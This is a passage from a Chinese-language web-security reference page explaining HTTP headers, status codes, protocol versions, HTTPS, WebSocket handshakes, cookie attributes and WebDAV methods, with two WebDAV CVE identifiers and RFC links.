no-cache</li>\n</ul>\n</li>\n<li>Connection\n<ul>\n<li>表示是否需要持久连接 // HTTP 1.1 默认进行持久连接</li>\n<li>Connection: close</li>\n</ul>\n</li>\n<li>Cookie\n<ul>\n<li>HTTP 请求发送时，会把保存在该请求域名下的所有 cookie 值一起发送给 web 服务器</li>\n<li>Cookie: role=admin;ssid=1</li>\n</ul>\n</li>\n<li>Content-Length\n<ul>\n<li>请求的内容长度</li>\n<li>Content-Length: 348</li>\n</ul>\n</li>\n<li>Content-Type\n<ul>\n<li>请求的与实体对应的 MIME 信息</li>\n<li>Content-Type: application/x-www-form-urlencoded</li>\n</ul>\n</li>\n<li>Date\n<ul>\n<li>请求发送的日期和时间</li>\n<li>Date: Tue, 15 Nov 2010 08:12:31 GMT</li>\n</ul>\n</li>\n<li>Expect\n<ul>\n<li>请求的特定的服务器行为</li>\n<li>Expect: 100-continue</li>\n</ul>\n</li>\n<li>From\n<ul>\n<li>发出请求的用户的</li>\n<li>EmailFrom: <span class=\"exturl\" data-url=\"bWFpbHRvOnVzZXJAZW1haWwuY29t\">user@email.com</span></li>\n</ul>\n</li>\n<li>Host\n<ul>\n<li>指定请求的服务器的域名和端口号</li>\n<li>Host: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5naXRodWIuY29t\">www.github.com</span></li>\n</ul>\n</li>\n<li>If-Match\n<ul>\n<li>只有请求内容与实体相匹配才有效</li>\n<li>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</li>\n</ul>\n</li>\n<li>If-Modified-Since\n<ul>\n<li>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回 304 代码</li>\n<li>If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT</li>\n</ul>\n</li>\n<li>If-None-Match\n<ul>\n<li>如果内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改变</li>\n<li>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</li>\n</ul>\n</li>\n<li>If-Range\n<ul>\n<li>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为 Etag</li>\n<li>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</li>\n</ul>\n</li>\n<li>If-Unmodified-Since\n<ul>\n<li>只在实体在指定时间之后未被修改才请求成功</li>\n<li>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</li>\n</ul>\n</li>\n<li>Max-Forwards\n<ul>\n<li>限制信息通过代理和网关传送的时间</li>\n<li>Max-Forwards: 10</li>\n</ul>\n</li>\n<li>Pragma\n<ul>\n<li>用来包含实现特定的指令</li>\n<li>Pragma: no-cache</li>\n</ul>\n</li>\n<li>Proxy-Authorization\n<ul>\n<li>连接到代理的授权证书</li>\n<li>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</li>\n</ul>\n</li>\n<li>Range\n<ul>\n<li>只请求实体的一部分，指定范围</li>\n<li>Range: bytes=500-999</li>\n</ul>\n</li>\n<li>Referer\n<ul>\n<li>先前网页的地址，当前请求网页紧随其后，即来路</li>\n<li>Referer: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvNzEuaHRtbA==\">http://www.zcmhi.com/archives/71.html</span></li>\n</ul>\n</li>\n<li>TE\n<ul>\n<li>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</li>\n<li>TE: trailers,deflate;q=0.5</li>\n</ul>\n</li>\n<li>Upgrade\n<ul>\n<li>向服务器指定某种传输协议以便服务器进行转换（如果支持）</li>\n<li>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</li>\n</ul>\n</li>\n<li>User-Agent\n<ul>\n<li>User-Agent 的内容包含发出请求的用户信息</li>\n<li>User-Agent: Mozilla/5.0 (Linux; X11)</li>\n</ul>\n</li>\n<li>Via\n<ul>\n<li>通知中间网关或代理服务器地址，通信协议</li>\n<li>Via: 1.0 fred, 1.1 <span class=\"exturl\" data-url=\"aHR0cDovL25vd2hlcmUuY29t\">nowhere.com</span> (Apache/1.1)</li>\n</ul>\n</li>\n<li>Warning\n<ul>\n<li>关于消息实体的警告信息</li>\n<li>Warn: 199 Miscellaneous warning</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"响应头列表\"><a class=\"anchor\" href=\"#响应头列表\">#</a> 响应头列表</h2>\n<ul>\n<li>Accept-Ranges\n<ul>\n<li>表明服务器是否支持指定范围请求及哪种类型的分段请求</li>\n<li>Accept-Ranges: bytes</li>\n</ul>\n</li>\n<li>Access-Control-Allow-Origin\n<ul>\n<li>配置有权限访问资源的域</li>\n<li>Access-Control-Allow-Origin: &lt;origin&gt;|*</li>\n</ul>\n</li>\n<li>Age\n<ul>\n<li>从原始服务器到代理缓存形成的估算时间（以秒计，非负）</li>\n<li>Age: 12</li>\n</ul>\n</li>\n<li>Allow\n<ul>\n<li>对某网络资源的有效的请求行为，不允许则返回 405</li>\n<li>Allow: GET, HEAD</li>\n</ul>\n</li>\n<li>Cache-Control\n<ul>\n<li>告诉所有的缓存机制是否可以缓存及哪种类型</li>\n<li>Cache-Control: no-cache</li>\n</ul>\n</li>\n<li>Content-Encoding\n<ul>\n<li>web 服务器支持的返回内容压缩编码类型</li>\n<li>Content-Encoding: gzip</li>\n</ul>\n</li>\n<li>Content-Language\n<ul>\n<li>响应体的语言</li>\n<li>Content-Language: en,zh</li>\n</ul>\n</li>\n<li>Content-Length\n<ul>\n<li>响应体的长度</li>\n<li>Content-Length: 348</li>\n</ul>\n</li>\n<li>Content-Location\n<ul>\n<li>请求资源可替代的备用的另一地址</li>\n<li>Content-Location: /index.htm</li>\n</ul>\n</li>\n<li>Content-MD5\n<ul>\n<li>返回资源的 MD5 校验值</li>\n<li>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</li>\n</ul>\n</li>\n<li>Content-Range\n<ul>\n<li>在整个返回体中本部分的字节位置</li>\n<li>Content-Range: bytes 21010-47021/47022</li>\n</ul>\n</li>\n<li>Content-Type\n<ul>\n<li>返回内容的 MIME 类型</li>\n<li>Content-Type: text/html; charset=utf-8</li>\n</ul>\n</li>\n<li>Date\n<ul>\n<li>原始服务器消息发出的时间</li>\n<li>Date: Tue, 15 Nov 2010 08:12:31 GMT</li>\n</ul>\n</li>\n<li>ETag\n<ul>\n<li>请求变量的实体标签的当前值</li>\n<li>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</li>\n</ul>\n</li>\n<li>Expires\n<ul>\n<li>响应过期的日期和时间</li>\n<li>Expires: Thu, 01 Dec 2010 16:00:00 GMT</li>\n</ul>\n</li>\n<li>Last-Modified\n<ul>\n<li>请求资源的最后修改时间</li>\n<li>Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT</li>\n</ul>\n</li>\n<li>Location\n<ul>\n<li>用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源</li>\n<li>Location: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvOTQuaHRtbA==\">http://www.zcmhi.com/archives/94.html</span></li>\n</ul>\n</li>\n<li>Pragma\n<ul>\n<li>包括实现特定的指令，它可应用到响应链上的任何接收方</li>\n<li>Pragma: no-cache</li>\n</ul>\n</li>\n<li>Proxy-Authenticate\n<ul>\n<li>它指出认证方案和可应用到代理的该 URL 上的参数</li>\n<li>Proxy-Authenticate: Basic</li>\n</ul>\n</li>\n<li>Refresh\n<ul>\n<li>应用于重定向或一个新的资源被创造，在 5 秒之后重定向（由网景提出，被大部分浏览器支持）</li>\n<li>Refresh: 5; url=http://www.zcmhi.com/archives/94.html</li>\n</ul>\n</li>\n<li>Retry-After\n<ul>\n<li>如果实体暂时不可取，通知客户端在指定时间之后再次尝试</li>\n<li>Retry-After: 120</li>\n</ul>\n</li>\n<li>Server\n<ul>\n<li>web 服务器软件名称</li>\n<li>Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</li>\n</ul>\n</li>\n<li>Set-Cookie\n<ul>\n<li>设置 Http Cookie</li>\n<li>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</li>\n</ul>\n</li>\n<li>Strict-Transport-Security\n<ul>\n<li>设置浏览器强制使用 HTTPS 访问</li>\n<li>max-age: x 秒的时间内 访问对应域名都使用 HTTPS 请求</li>\n<li>includeSubDomains: 网站的子域名也启用规则</li>\n<li>Strict-Transport-Security: max-age=1000; includeSubDomains</li>\n</ul>\n</li>\n<li>Trailer\n<ul>\n<li>指出头域在分块传输编码的尾部存在</li>\n<li>Trailer: Max-Forwards</li>\n</ul>\n</li>\n<li>Transfer-Encoding\n<ul>\n<li>文件传输编码</li>\n<li>Transfer-Encoding:chunked</li>\n</ul>\n</li>\n<li>Vary\n<ul>\n<li>告诉下游代理是使用缓存响应还是从原始服务器请求</li>\n<li>Vary: *</li>\n</ul>\n</li>\n<li>Via\n<ul>\n<li>告知代理客户端响应是通过哪里发送的</li>\n<li>Via: 1.0 fred, 1.1 <span class=\"exturl\" data-url=\"aHR0cDovL25vd2hlcmUuY29t\">nowhere.com</span> (Apache/1.1)</li>\n</ul>\n</li>\n<li>Warning\n<ul>\n<li>警告实体可能存在的问题</li>\n<li>Warning: 199 Miscellaneous warning</li>\n</ul>\n</li>\n<li>WWW-Authenticate\n<ul>\n<li>表明客户端请求实体应该使用的授权方案</li>\n<li>WWW-Authenticate: Basic</li>\n</ul>\n</li>\n<li>X-Content-Type-Options\n<ul>\n<li>配置禁止 MIME 类型嗅探</li>\n<li>X-Content-Type-Options: nosniff</li>\n</ul>\n</li>\n<li>X-Frame-Options\n<ul>\n<li>配置页面是否能出现在 &lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt;, &lt;object&gt; 等标签中，防止点击劫持</li>\n<li>X-Frame-Options: deny</li>\n</ul>\n</li>\n<li>X-XSS-Protection\n<ul>\n<li>配置 XSS 防护机制</li>\n<li>X-XSS-Protection: 1; mode=block</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"http状态返回代码-1xx临时响应\"><a class=\"anchor\" href=\"#http状态返回代码-1xx临时响应\">#</a> HTTP 状态返回代码 1xx（临时响应）</h2>\n<p>表示临时响应并需要请求者继续执行操作的状态代码。</p>\n<table>\n<thead>\n<tr>\n<th>Code</th>\n<th>代码</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>100</td>\n<td>继续</td>\n<td>服务器返回此代码表示已收到请求的第一部分，正在等待其余部分</td>\n</tr>\n<tr>\n<td>101</td>\n<td>切换协议</td>\n<td>请求者已要求服务器切换协议，服务器已确认并准备切换</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"http状态返回代码-2xx-成功\"><a class=\"anchor\" href=\"#http状态返回代码-2xx-成功\">#</a> HTTP 状态返回代码 2xx （成功）</h2>\n<p>表示成功处理了请求的状态代码。</p>\n<table>\n<thead>\n<tr>\n<th>Code</th>\n<th>代码</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>200</td>\n<td>成功</td>\n<td>服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页</td>\n</tr>\n<tr>\n<td>201</td>\n<td>已创建</td>\n<td>请求成功并且服务器创建了新的资源</td>\n</tr>\n<tr>\n<td>202</td>\n<td>已接受</td>\n<td>服务器已接受请求，但尚未处理</td>\n</tr>\n<tr>\n<td>203</td>\n<td>非授权信息</td>\n<td>服务器已成功处理了请求，但返回的信息可能来自另一来源</td>\n</tr>\n<tr>\n<td>204</td>\n<td>无内容</td>\n<td>服务器成功处理了请求，但没有返回任何内容</td>\n</tr>\n<tr>\n<td>205</td>\n<td>重置内容</td>\n<td>m 服务器成功处理了请求，但没有返回任何内容</td>\n</tr>\n<tr>\n<td>206</td>\n<td>部分内容</td>\n<td>服务器成功处理了部分 GET 请求</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"http状态返回代码-3xx-重定向\"><a class=\"anchor\" href=\"#http状态返回代码-3xx-重定向\">#</a> HTTP 状态返回代码 3xx （重定向）</h2>\n<p>表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</p>\n<table>\n<thead>\n<tr>\n<th>Code</th>\n<th>代码</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>300</td>\n<td>多种选择</td>\n<td>针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。</td>\n</tr>\n<tr>\n<td>301</td>\n<td>永久移动</td>\n<td>请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。</td>\n</tr>\n<tr>\n<td>302</td>\n<td>临时移动</td>\n<td>服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>\n</tr>\n<tr>\n<td>303</td>\n<td>查看其他位置</td>\n<td>请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</td>\n</tr>\n<tr>\n<td>304</td>\n<td>未修改</td>\n<td>自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。</td>\n</tr>\n<tr>\n<td>305</td>\n<td>使用代理</td>\n<td>请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。</td>\n</tr>\n<tr>\n<td>307</td>\n<td>临时重定向</td>\n<td>服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"http状态返回代码-4xx请求错误\"><a class=\"anchor\" href=\"#http状态返回代码-4xx请求错误\">#</a> HTTP 状态返回代码 4xx（请求错误）</h2>\n<p>这些状态代码表示请求可能出错，妨碍了服务器的处理。</p>\n<table>\n<thead>\n<tr>\n<th>Code</th>\n<th>代码</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>400</td>\n<td>错误请求</td>\n<td>服务器不理解请求的语法。</td>\n</tr>\n<tr>\n<td>401</td>\n<td>未授权</td>\n<td>请求要求身份验证。对于需要登录的网页，服务器可能返回此响应。</td>\n</tr>\n<tr>\n<td>403</td>\n<td>禁止</td>\n<td>服务器拒绝请求。</td>\n</tr>\n<tr>\n<td>404</td>\n<td>未找到</td>\n<td>服务器找不到请求的网页。</td>\n</tr>\n<tr>\n<td>405</td>\n<td>方法禁用</td>\n<td>禁用请求中指定的方法。</td>\n</tr>\n<tr>\n<td>406</td>\n<td>不接受</td>\n<td>无法使用请求的内容特性响应请求的网页。</td>\n</tr>\n<tr>\n<td>407</td>\n<td>需要代理授权</td>\n<td>此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。</td>\n</tr>\n<tr>\n<td>408</td>\n<td>请求超时</td>\n<td>服务器等候请求时发生超时。</td>\n</tr>\n<tr>\n<td>409</td>\n<td>冲突</td>\n<td>服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。</td>\n</tr>\n<tr>\n<td>410</td>\n<td>已删除</td>\n<td>如果请求的资源已永久删除，服务器就会返回此响应。</td>\n</tr>\n<tr>\n<td>411</td>\n<td>需要有效长度</td>\n<td>服务器不接受不含有效内容长度标头字段的请求。</td>\n</tr>\n<tr>\n<td>412</td>\n<td>未满足前提条件</td>\n<td>服务器未满足请求者在请求中设置的其中一个前提条件。</td>\n</tr>\n<tr>\n<td>413</td>\n<td>请求实体过大</td>\n<td>服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。</td>\n</tr>\n<tr>\n<td>414</td>\n<td>请求的 URI 过长</td>\n<td>请求的 URI（通常为网址）过长，服务器无法处理。</td>\n</tr>\n<tr>\n<td>415</td>\n<td>不支持的媒体类型</td>\n<td>请求的格式不受请求页面的支持。</td>\n</tr>\n<tr>\n<td>416</td>\n<td>请求范围不符合要求</td>\n<td>如果页面无法提供请求的范围，则服务器会返回此状态代码。</td>\n</tr>\n<tr>\n<td>417</td>\n<td>未满足期望值</td>\n<td>服务器未满足 &quot;期望&quot; 请求标头字段的要求。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"http状态返回代码-5xx服务器错误\"><a class=\"anchor\" href=\"#http状态返回代码-5xx服务器错误\">#</a> HTTP 状态返回代码 5xx（服务器错误）</h2>\n<p>这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</p>\n<table>\n<thead>\n<tr>\n<th>Code</th>\n<th>代码</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>500</td>\n<td>服务器内部错误</td>\n<td>服务器遇到错误，无法完成请求。</td>\n</tr>\n<tr>\n<td>501</td>\n<td>尚未实施</td>\n<td>服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。</td>\n</tr>\n<tr>\n<td>502</td>\n<td>错误网关</td>\n<td>服务器作为网关或代理，从上游服务器收到无效响应。</td>\n</tr>\n<tr>\n<td>503</td>\n<td>服务不可用</td>\n<td>服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。</td>\n</tr>\n<tr>\n<td>504</td>\n<td>网关超时</td>\n<td>服务器作为网关或代理，但是没有及时从上游服务器收到请求。</td>\n</tr>\n<tr>\n<td>505</td>\n<td>HTTP 版本不受支持</td>\n<td>服务器不支持请求中所用的 HTTP 协议版本。</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"http-版本\"><a class=\"anchor\" href=\"#http-版本\">#</a> HTTP 版本</h1>\n<h2 id=\"http\"><a class=\"anchor\" href=\"#http\">#</a> HTTP</h2>\n<p>HTTP 是基于 TCP/IP 协议的应用层协议，主要规定了客户端和服务器之间的通信格式，默认使用 80 端口。</p>\n<h2 id=\"http-09\"><a class=\"anchor\" href=\"#http-09\">#</a> HTTP 0.9</h2>\n<p>HTTP 0.9 最早在 1991 年发布，仅支持 GET 命令，请求格式只有简单的  <code>GET /url</code>  ，服务端仅响应 HTML，响应完毕后关闭 TCP 连接。</p>\n<h2 id=\"http-10\"><a class=\"anchor\" href=\"#http-10\">#</a> HTTP 1.0</h2>\n<p>1996 年 5 月，HTTP/1.0 版本发布，丰富了传输的格式和内容，还引入了 POST、HEAD 两个动词。从 1.0 开始，必须在尾部添加协议版本。在 1.0 中，也引入了状态码 (status code)、多字符集支持、多部分发送 (multi-part type)、权限 (authorization)、缓存 (cache)、内容编码 (content encoding) 等内容。</p>\n<p>HTTP 1.0 版的主要缺点是，每个 TCP 连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。</p>\n<p>TCP 连接的新建成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢 (slow start)，所以，HTTP 1.0 版本的性能比较差。</p>\n<h2 id=\"http-11\"><a class=\"anchor\" href=\"#http-11\">#</a> HTTP 1.1</h2>\n<p>1997 年 1 月，HTTP/1.1 版本发布，进一步完善了 HTTP 协议。1.1 版本主要是引入了持久连接、管道机制、Content-Length、分块传输编码等内容。管道机制即在同一个 TCP 连接里面，客户端可以同时发送多个请求，这样就改进了 HTTP 协议的效率。PUT、PATCH、HEAD、 OPTIONS、DELETE 等动词方法也是在 HTTP 1.1 版本引入的。另外 1.1 版本新增了 Host 字段，用于指定服务器的域名，这也是后来虚拟主机得以发展的基础。</p>\n<p>虽然 1.1 版允许复用 TCP 连接，但是同一个 TCP 连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。如果有一个请求很慢，就会阻塞后面的请求。</p>\n<h2 id=\"spdy\"><a class=\"anchor\" href=\"#spdy\">#</a> SPDY</h2>\n<p>2009 年，谷歌公开了自行研发的 SPDY 协议，用于解决 HTTP/1.1 效率不高的问题，而后被当做 HTTP/2 的基础。</p>\n<h2 id=\"http2\"><a class=\"anchor\" href=\"#http2\">#</a> HTTP/2</h2>\n<p>2015 年，HTTP/2 发布，HTTP/2 是一个二进制协议，头信息和数据体都是二进制，统称为帧 (frame)，帧分为头信息帧和数据帧。HTTP/2 复用 TCP 连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序回应。</p>\n<h1 id=\"https\"><a class=\"anchor\" href=\"#https\">#</a> HTTPS</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>HTTPS (HyperText Transfer Protocol over Secure Socket Layer) 可以理解为 HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，HTTPS 的安全基础是 SSL。</p>\n<h2 id=\"交互\"><a class=\"anchor\" href=\"#交互\">#</a> 交互</h2>\n<h3 id=\"证书验证阶段\"><a class=\"anchor\" href=\"#证书验证阶段\">#</a> 证书验证阶段</h3>\n<ul>\n<li>浏览器发起 HTTPS 请求</li>\n<li>服务端返回 HTTPS 证书\n<ul>\n<li>其中证书包含：\n<ul>\n<li>颁发机构信息</li>\n<li>公钥</li>\n<li>公司信息</li>\n<li>域名</li>\n<li>有效期</li>\n<li>指纹</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>客户端验证证书是否合法，如果不合法则提示告警</li>\n</ul>\n<h3 id=\"数据传输阶段\"><a class=\"anchor\" href=\"#数据传输阶段\">#</a> 数据传输阶段</h3>\n<ul>\n<li>当证书验证合法后，在本地生成随机数</li>\n<li>通过公钥加密随机数，并把加密后的随机数传输到服务端</li>\n<li>服务端通过私钥对随机数进行解密</li>\n<li>服务端通过客户端传入的随机数构造对称加密算法，对返回结果内容进行加密后传输</li>\n</ul>\n<h2 id=\"ca\"><a class=\"anchor\" href=\"#ca\">#</a> CA</h2>\n<p>CA (Certificate Authority) 是颁发数字证书的机构。是负责发放和管理数字证书的权威机构，并作为电子商务交易中受信任的第三方，承担公钥体系中公钥的合法性检验的责任。</p>\n<h1 id=\"websocket\"><a class=\"anchor\" href=\"#websocket\">#</a> WebSocket</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>WebSocket 是一种网络传输协议，可在单个 TCP 连接上进行全双工通信，位于 OSI 模型的应用层。WebSocket 协议在 2011 年由 IETF 标准化为 RFC 6455，后由 RFC 7936 补充规范。</p>\n<h2 id=\"交互-2\"><a class=\"anchor\" href=\"#交互-2\">#</a> 交互</h2>\n<h3 id=\"握手\"><a class=\"anchor\" href=\"#握手\">#</a> 握手</h3>\n<p>握手阶段和 HTTP 协议较为类似，RFC 文档中给出的握手示例如下：</p>\n<pre><code>GET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nOrigin: http://example.com\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\n</code></pre>\n<p>其中 Upgrade 的值必须为 websocket ，Connection 的值必须为 Upgrade ，合起来表示客户端喜欢连接升级到 Websocket 协议。</p>\n<p>Sec-WebSocket-Key 是一个随机值，Sec-WebSocket-Accept 是 Sec-WebSocket-Key 拼接特定字符串  <code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>  计算 SHA1 摘要后的 Base64 编码的值。例子中  <code>s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</code>  就是  <code>dGhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>  对应的 SHA1 摘要。</p>\n<h1 id=\"cookie\"><a class=\"anchor\" href=\"#cookie\">#</a> Cookie</h1>\n<h2 id=\"2751-简介\"><a class=\"anchor\" href=\"#2751-简介\">#</a> 2.7.5.1. 简介</h2>\n<p>Cookie（复数形态 Cookies），类型为「小型文本文件」，指某些网站为了辨别用户身份而储存在用户本地终端上的数据。</p>\n<h2 id=\"2752-属性\"><a class=\"anchor\" href=\"#2752-属性\">#</a> 2.7.5.2. 属性</h2>\n<h3 id=\"name\"><a class=\"anchor\" href=\"#name\">#</a> name</h3>\n<p>cookie 的名称。</p>\n<h3 id=\"value\"><a class=\"anchor\" href=\"#value\">#</a> value</h3>\n<p>cookie 的值。</p>\n<h3 id=\"expires\"><a class=\"anchor\" href=\"#expires\">#</a> expires</h3>\n<p>当 Expires 属性缺省时，表示是会话性 Cookie，在用户关闭浏览器时失效。</p>\n<h3 id=\"max-age\"><a class=\"anchor\" href=\"#max-age\">#</a> max-age</h3>\n<p>max-age 可以为正数、负数、0。如果 max-age 属性为正数时，浏览器会将其持久化，当 max-age 属性为负数，则表示该 Cookie 只是一个会话性 Cookie。当 max-age 为 0 时，则会立即删除这个 Cookie。Expires 和 max-age 都存在的条件下，max-age 优先级更高。</p>\n<h3 id=\"domain\"><a class=\"anchor\" href=\"#domain\">#</a> domain</h3>\n<p>指定 Cookie 的域名，默认是当前域名。domain 设置时可以设置为自身及其父域，子域可以访问父域的 Cookie，反之不能。</p>\n<h3 id=\"path\"><a class=\"anchor\" href=\"#path\">#</a> path</h3>\n<p>指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送对应的 Cookie。</p>\n<h3 id=\"secure\"><a class=\"anchor\" href=\"#secure\">#</a> secure</h3>\n<p>只能通过 HTTPS 传输。</p>\n<h3 id=\"httponly\"><a class=\"anchor\" href=\"#httponly\">#</a> httponly</h3>\n<p>限制 Cookie 仅在 HTTP 传输过程中被读取，一定程度上防御 XSS 攻击。</p>\n<h3 id=\"samesite\"><a class=\"anchor\" href=\"#samesite\">#</a> SameSite</h3>\n<p>SameSite 支持 Strict / Lax / None 三种值。Strict 最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。Lax 允许部分第三方请求携带 Cookie，主要是链接、预加载、GET 表单三种情况。Cookie 的 SameSite 属性为 None ，且设置了 Secure 时，无论是否跨站都会发送 Cookie。</p>\n<h1 id=\"webdav\"><a class=\"anchor\" href=\"#webdav\">#</a> WebDAV</h1>\n<h2 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h2>\n<p>WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 HTTP 1.1 协议的通信协议。它扩展了 HTTP 1.1，在 GET、POST、HEAD 等几个 HTTP 标准方法以外添加了一些新的方法，使应用程序可对 Web Server 直接读写，并支持写文件锁定、解锁，以及版本控制等功能。</p>\n<p>支持的方法具体为：</p>\n<ul>\n<li>OPTIONS\n<ul>\n<li>获取服务器的支持</li>\n</ul>\n</li>\n<li>GET / PUT / POST / DELETE\n<ul>\n<li>资源操作</li>\n</ul>\n</li>\n<li>TRACE\n<ul>\n<li>跟踪服务器</li>\n</ul>\n</li>\n<li>HEAD</li>\n<li>MKCOL\n<ul>\n<li>创建集合</li>\n</ul>\n</li>\n<li>PROPFIND / PROPPATCH</li>\n<li>COPY / MOVE</li>\n<li>LOCK / UNLOCK</li>\n</ul>\n<h2 id=\"相关cve\"><a class=\"anchor\" href=\"#相关cve\">#</a> 相关 CVE</h2>\n<ul>\n<li>CVE-2015-1833\n<ul>\n<li>Apache Jacrabbit WebDav XXE</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zZWN1cml0eWZvY3VzLmNvbS9hcmNoaXZlLzEvNTM1NTgy\">http://www.securityfocus.com/archive/1/535582</span></li>\n</ul>\n</li>\n<li>CVE-2015-7326\n<ul>\n<li>Milton WebDav XXE</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zZWN1cml0eWZvY3VzLmNvbS9hcmNoaXZlLzEvNTM2ODEz\">http://www.securityfocus.com/archive/1/536813</span></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"rfc\"><a class=\"anchor\" href=\"#rfc\">#</a> RFC</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzMyNTM=\">RFC 3253</span> Versioning Extensions to WebDAV (Web Distributed Authoring and Versioning)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM2NDg=\">RFC 3648</span> Web Distributed Authoring and Versioning (WebDAV) Ordered Collections Protocol</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM3NDQ=\">RFC 3744</span> Web Distributed Authoring and Versioning (WebDAV) Access Control Protocol</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzQ0Mzc=\">RFC 4437</span> Web Distributed Authoring and Versioning (WebDAV) Redirect Reference Resources</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzQ5MTg=\">RFC 4918</span> HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUzMjM=\">RFC 5323</span> Web Distributed Authoring and Versioning (WebDAV) SEARCH</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzU4NDI=\">RFC 5842</span> Binding Extensions to Web Distributed Authoring and Versioning (WebDAV)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kYXRhdHJhY2tlci5pZXRmLm9yZy9kb2MvaHRtbC9yZmM2NDU1\">The WebSocket Protocol</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kYXRhdHJhY2tlci5pZXRmLm9yZy9kb2MvaHRtbC9yZmM3OTM2\">Clarifying Registry Procedures for the 